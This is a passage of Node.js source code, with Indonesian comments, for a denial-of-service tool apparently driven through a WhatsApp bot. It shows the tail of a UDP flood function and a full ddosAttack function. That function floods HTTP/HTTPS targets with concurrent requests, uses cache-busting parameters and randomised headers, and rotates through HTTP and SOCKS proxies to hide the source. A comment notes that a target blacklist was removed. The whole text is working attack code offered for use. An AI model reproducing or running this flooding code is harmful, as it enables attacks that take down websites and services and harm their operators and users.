            const message = Buffer.from(generateRandomString(4096)); // Paket UDP 4KB random data
            const client = dgram.createSocket('udp4');

            packets.push(new Promise(resolve => {
                client.send(message, targetPort, targetHost, (err) => {
                    totalPacketCount++;
                    if (err) {
                        errorPacketCount++;
                        console.log(chalk.red(`[ UDP Error ] ${targetHost}:${targetPort} - ${err.message}`));
                    } else {
                        successPacketCount++;
                        console.log(chalk.green(`[ UDP Sent ] ${targetHost}:${targetPort}`));
                    }
                    client.close(); // Tutup socket setelah mengirim
                    resolve();
                });
            }));
        }
        await Promise.allSettled(packets);
    };

    const intervalMs = Math.max(1, Math.floor(1000 / concurrency));
    const interval = setInterval(sendUdpPacket, intervalMs);
}


// --- Fungsi ddosAttack dimodifikasi tanpa blacklist ---
async function ddosAttack(sock, target, duration, concurrency, method) {
    if (method.toUpperCase() === 'UDP') {
        const parts = target.split(':');
        if (parts.length !== 2 || isNaN(parseInt(parts[1]))) {
            return sock.sendMessage(sock.user.id, {text:('Untuk UDP Flood, target harus dalam format `host:port`, contoh: `example.com:80`'})
        }
        const targetHost = parts[0];
        const targetPort = parseInt(parts[1]);

        if (isNaN(duration) || duration < 1) {
            return sock.sendMessage(sock.user.id, {text:'Durasi (detik) harus angka dan lebih dari 0'})
        }
        if (isNaN(concurrency) || concurrency < 1) {
            return sock.sendMessage(sock.user.id, {text:'Concurrency (jumlah paket paralel) harus angka dan lebih dari 0'});
        }

        await udpFlood(sock, targetHost, targetPort, duration, concurrency);
        return;
    }

    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return sock.sendMessage(sock.user.id, {text:'URL harus diawali `http://` atau `https://` untuk metode HTTP/HTTPS'});
    }
    if (isNaN(duration) || duration < 1) {
        return sock.sendMessage(sock.user.id, {text:'Durasi (detik) harus angka dan lebih dari 0'});
    }
    if (isNaN(concurrency) || concurrency < 1) {
        return sock.sendMessage(sock.user.id, {text:'Concurrency (jumlah request paralel) harus angka dan lebih dari 0'});
    }
    const validHttpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD'];
    if (!validHttpMethods.includes(method.toUpperCase())) {
        return sock.sendMessage(sock.user.id, {text:`Method HTTP tidak valid. Pilihan: ${validHttpMethods.join(', ')}. Atau gunakan 'UDP' untuk UDP Flood`});
    }

    await sock.sendMessage(sock.user.id, {text:`*DDoS attack (HTTP/HTTPS):*
> ▢ Target: *${target}*
> ▢ Durasi: *${duration} detik*
> ▢ Concurrency: *${concurrency} request paralel*
> ▢ Method: *${method}*
`});

    let totalRequestCount = 0;
    let successCount = 0;
    let errorCount = 0;
    let statusCounts = {};
    const startTime = Date.now();
    const endTime = startTime + duration * 1000;

    const sendRequests = async () => {
        if (Date.now() >= endTime) {
            clearInterval(interval);
            const totalTimeElapsed = (Date.now() - startTime) / 1000;
            const averageRPS = totalRequestCount / totalTimeElapsed;

            await sock.sendMessage(sock.user.id, {text:`*DDoS attack completed!*

▢ Target: *${target}*
▢ Durasi: ${duration} detik
▢ Concurrency: ${concurrency}
▢ Method: ${method}

▢ Total Request Terkirim: *${totalRequestCount}*
▢ Berhasil: *${successCount}*
▢ Gagal/Error: *${errorCount}*
▢ Rata-rata RPS: *${averageRPS.toFixed(2)}*
▢ Detail Status Kode: ${Object.entries(statusCounts).map(([code, count]) => `\`${code}: ${count}\``).join(', ') || 'Tidak ada respons'}`})

            console.log(`DDoS attack ke ${target} selesai. Total: ${totalRequestCount}, Sukses: ${successCount}, Gagal: ${errorCount}, RPS: ${averageRPS.toFixed(2)}`);
            return;
        }

        const requests = [];
        for (let i = 0; i < concurrency; i++) {
            const urlWithCacheBuster = new URL(target);
            urlWithCacheBuster.searchParams.set('_t', Date.now());
            urlWithCacheBuster.searchParams.set('_r', crypto.randomUUID());

            const headers = generateHeaders();
            let proxy = getAvailableProxy();

            if (!proxy) {
                console.warn(chalk.yellow('Tidak ada proxy yang tersedia untuk permintaan ini. Melewatkan permintaan.'));
                errorCount++;
                totalRequestCount++;
                continue;
            }

            const config = {
                method,
                url: urlWithCacheBuster.toString(),
                headers,
                timeout: 10000,
                validateStatus: () => true,
            };

            if (['POST', 'PUT'].includes(method)) {
                config.data = generateRandomPayload(4096);
                config.headers['Content-Type'] = 'application/json';
            }

            if (proxy.protocol === 'http' || proxy.protocol === 'https') {
                config.proxy = {
                    host: proxy.ip,
                    port: proxy.port,
                    protocol: proxy.protocol
                };
            } else if (proxy.protocol === 'socks4' || proxy.protocol === 'socks5') {
                const agent = new SocksProxyAgent(`${proxy.protocol}://${proxy.ip}:${proxy.port}`);
                config.httpAgent = agent;
                config.httpsAgent = agent;
                config.proxy = false;
            } else {
                // Protokol tidak didukung, skipping request
                console.warn(chalk.yellow(`Proxy ${proxy.ip}:${proxy.port} memiliki protokol tidak didukung untuk HTTP/HTTPS, skip.`));
                errorCount++;
                totalRequestCount++;
                continue;
            }

            requests.push(
                axios(config)
                .then(response => {
                    totalRequestCount++;
                    const statusCode = response.status;
                    statusCounts[statusCode] = (statusCounts[statusCode] || 0) + 1;
                    if (statusCode >= 200 && statusCode < 300) {
                        successCount++;
                        console.log(
                            chalk.green(`[ ${statusCode} ]`) +
                            chalk.gray(` ${target} >> ${proxy.ip}:${proxy.port}`)
                        );
                    } else {
                        errorCount++;
                        console.log(
                            chalk.red(`[ ${statusCode} ]`) +
                            chalk.gray(` ${target} >> ${proxy.ip}:${proxy.port}`)
                        );
                    }
                })
                .catch(error => {
                    totalRequestCount++;
                    errorCount++;
                    const proxyInfo = `${proxy.ip}:${proxy.port}`;
                    let errorMessage = error.message;

                    if (error.response) {
                        const statusCode = error.response.status;
                        statusCounts[statusCode] = (statusCounts[statusCode] || 0) + 1;
                        console.log(
                            chalk.red(`[ ${statusCode} ]`) +
                            chalk.gray(` ${target} >> ${proxyInfo} - ${errorMessage}`)
                        );
                    } else if (error.request) {
                        statusCounts['No Response/Timeout'] = (statusCounts['No Response/Timeout'] || 0) + 1;
                        console.log(
                            chalk.red(`[ No Response/Timeout ]`) +
                            chalk.gray(` ${target} >> ${proxyInfo} - ${errorMessage}`)
                        );
                    } else {
                        statusCounts['Other Error'] = (statusCounts['Other Error'] || 0) + 1;
                        console.log(
                            chalk.red(`[ Error ]`) +
                            chalk.gray(` ${target} >> ${proxyInfo} - ${errorMessage}`)
                        );
                    }
                })
            );
        }
        await Promise.allSettled(requests);
    };

    const intervalMs = Math.max(1, Math.floor(1000 / concurrency));
    const interval = setInterval(sendRequests, intervalMs);
}

module.exports = {
    ddosAttack
};